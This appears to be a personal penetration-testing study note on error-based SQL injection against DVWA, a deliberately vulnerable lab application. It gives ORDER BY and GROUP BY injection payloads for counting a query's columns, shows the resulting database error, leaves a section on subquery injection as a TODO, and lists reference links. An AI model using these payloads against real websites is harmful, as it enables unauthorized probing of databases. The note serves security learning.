# 01 - Database Reconnaissance

Search Tag(s): #sql-injection #error-based #dvwa

## 1.1 - Dump Database

### 1.1.1 - Columns Enumeration

#### 1.1.1.1 - ORDER BY Detection

^f521af

We need to determine number of columns before we perform.

```sql
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#
```

- Keep Enumerating it until you've triggered an error.

![[01 - ORDER BY Enumerate One Field.png]]

```
Unknown column '3' in 'order clause'
```

3 - 1 = 2

We have two columns.

- You can also to enumerate is to end it at 100 fields.

```sql
' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100#
```

#### 1.1.1.2 - GROUP BY Detection

- You can enumerate it with **GROUP BY** method and you'll get the same results.

```sql
' GROUP BY 1#
' GROUP BY 2#
' GROUP BY 3#
```

- You can also to enumerate is to end it at 100 fields.

```sql
' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100#
```

## 1.2 - SubQuery Injection

TODO: Fill the information with a step by step approach using error-based subquery SQL injection

---
## References

- [SecurityIdiots: Error-Based Injection Subquery Injection](https://securityidiots.com/Web-Pentest/SQL-Injection/Error-Based-Injection-Subquery-Injection.html)

- [Hacking Articles: Form Based SQL Injection Manually](https://www.hackingarticles.in/form-based-sql-injection-manually/)

- [GBHackers: Web Application Pentesting – Manual SQL Injection With Error Based String Method](https://gbhackers.com/manual-sql-injection/)

- [Web Application & SQL Injection Pen Test cheatsheet by D7X](https://sqli.promiselabs.net/)

- [Acunetix: SQLi - How it works](https://www.acunetix.com/blog/articles/sqli-how-it-works/)

- [PayloadsAllTheThings SQL Injection: MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)